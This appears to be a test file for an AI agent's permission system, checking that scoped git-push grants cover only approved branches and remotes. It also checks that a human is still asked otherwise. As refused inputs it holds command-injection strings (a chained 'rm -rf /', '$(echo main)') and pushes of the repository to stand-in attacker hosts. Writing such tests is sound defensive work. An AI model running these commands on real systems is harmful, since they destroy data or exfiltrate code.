/** Per-job scoped action grants (#233). */
import { describe, it, expect, vi } from 'vitest';
import { findCoveringGrant, parseGitPush, type ActionGrant } from '../../../src/security/action-grants.js';
import { PolicyEngine } from '../../../src/security/policy-engine.js';
import { createCapabilityToken } from '../../../src/security/capability-tokens.js';
import type { ZoraPolicy } from '../../../src/types.js';

const grant: ActionGrant = { id: 'g1', action: 'git_push', branches: ['agent/*'], remotes: ['origin'] };
const push = (command: string) => ({ command });

describe('parseGitPush', () => {
  it('parses remote and branch, handles refspecs and -u', () => {
    expect(parseGitPush('git push origin agent/x')).toEqual({ remote: 'origin', branches: ['agent/x'] });
    expect(parseGitPush('git push -u origin HEAD:refs/heads/agent/x')).toEqual({ remote: 'origin', branches: ['agent/x'] });
  });
  it.each([
    'git push', 'git push origin', 'git push --force origin agent/x', 'git push -f origin agent/x',
    'git push origin +agent/x', 'git push origin :agent/x', 'git push --all origin agent/x',
    'git push origin agent/x && rm -rf /', 'git push origin agent/x; ls', 'git push origin $(echo main)',
    'git push origin refs/tags/v1',
    'git push https://attacker.example/x.git agent/foo', 'git push git@evil.example:x/y.git agent/foo',
    'git push /tmp/other-repo agent/foo', 'git push ../elsewhere agent/foo',
  ])('refuses ambiguous/unsafe form: %s', cmd => {
    expect(parseGitPush(cmd)).toBeNull();
  });
});

describe('findCoveringGrant', () => {
  it('covers a push to a granted branch pattern only', () => {
    expect(findCoveringGrant([grant], 'git_push', push('git push origin agent/feat'))?.id).toBe('g1');
    expect(findCoveringGrant([grant], 'git_push', push('git push origin main'))).toBeNull();
    expect(findCoveringGrant([grant], 'git_push', push('git push upstream agent/feat'))).toBeNull();
    expect(findCoveringGrant([grant], 'git_push', push('git push origin agent/a main'))).toBeNull();
  });
  it('a URL remote is not covered even by an unconstrained-remote grant', () => {
    const g: ActionGrant = { id: 'g2', action: 'git_push', branches: ['agent/*'] };
    expect(findCoveringGrant([g], 'git_push', push('git push https://attacker.example/x.git agent/foo'))).toBeNull();
    expect(findCoveringGrant([g], 'git_push', push('git push origin agent/foo'))?.id).toBe('g2');
  });
  it('never honours a git_push grant without branches', () => {
    expect(findCoveringGrant([{ id: 'x', action: 'git_push' }], 'git_push', push('git push origin agent/a'))).toBeNull();
  });
  it('never honours a git_push grant without remotes (would cover URL remotes)', () => {
    const noRemotes: ActionGrant = { id: 'n', action: 'git_push', branches: ['agent/*'] };
    expect(findCoveringGrant([noRemotes], 'git_push', push('git push https://evil.example/x.git agent/a'))).toBeNull();
    expect(findCoveringGrant([noRemotes], 'git_push', push('git push origin agent/a'))).toBeNull();
    expect(findCoveringGrant([grant], 'git_push', push('git push https://evil.example/x.git agent/a'))).toBeNull();
  });
  it('does not cover other actions', () => {
    expect(findCoveringGrant([grant], 'shell_exec', push('ls'))).toBeNull();
    expect(findCoveringGrant(undefined, 'git_push', push('git push origin agent/a'))).toBeNull();
  });
});

describe('capability token carries grants', () => {
  it('copies grants onto the token; none by default', () => {
    const policy = { filesystem: { allowed_paths: [], denied_paths: [] }, shell: { allowed_commands: [], max_execution_time: '1m' } } as unknown as ZoraPolicy;
    expect(createCapabilityToken('j', policy).grants).toBeUndefined();
    expect(createCapabilityToken('j', policy, { grants: [grant] }).grants).toEqual([grant]);
  });
});

describe('PolicyEngine always_flag with grants', () => {
  const policy: ZoraPolicy = {
    filesystem: { allowed_paths: ['/home/user'], denied_paths: [], resolve_symlinks: true, follow_symlinks: false },
    shell: { mode: 'allowlist', allowed_commands: ['git'], denied_commands: [], split_chained_commands: true, max_execution_time: '1m' },
    actions: { reversible: [], irreversible: [], always_flag: ['git_push'] },
    network: { allowed_domains: [], denied_domains: [], max_request_size: '10mb' },
  };
  const signal = new AbortController().signal;
  const run = async (getGrants: (() => ActionGrant[] | undefined) | undefined, command: string) => {
    const engine = new PolicyEngine(policy);
    const flag = vi.fn(async () => false); // human always says no
    engine.setFlagCallback(flag);
    const res = await engine.createCanUseTool(getGrants)('Bash', { command }, { signal });
    return { res, flag };
  };

  it('push to a granted branch runs without a prompt', async () => {
    const { res, flag } = await run(() => [grant], 'git push origin agent/feat');
    expect(res.behavior).toBe('allow');
    expect(flag).not.toHaveBeenCalled();
  });
  it('push to main still asks (and is denied here)', async () => {
    const { res, flag } = await run(() => [grant], 'git push origin main');
    expect(flag).toHaveBeenCalled();
    expect(res.behavior).toBe('deny');
  });
  it('no grants keeps today\'s behaviour', async () => {
    const { res, flag } = await run(undefined, 'git push origin agent/feat');
    expect(flag).toHaveBeenCalled();
    expect(res.behavior).toBe('deny');
  });
  it('a grant cannot allow a command policy denies', async () => {
    const strict = new PolicyEngine({ ...policy, shell: { ...policy.shell, allowed_commands: [] } });
    const res = await strict.createCanUseTool(() => [grant])('Bash', { command: 'git push origin agent/x' }, { signal });
    expect(res.behavior).toBe('deny');
  });
});
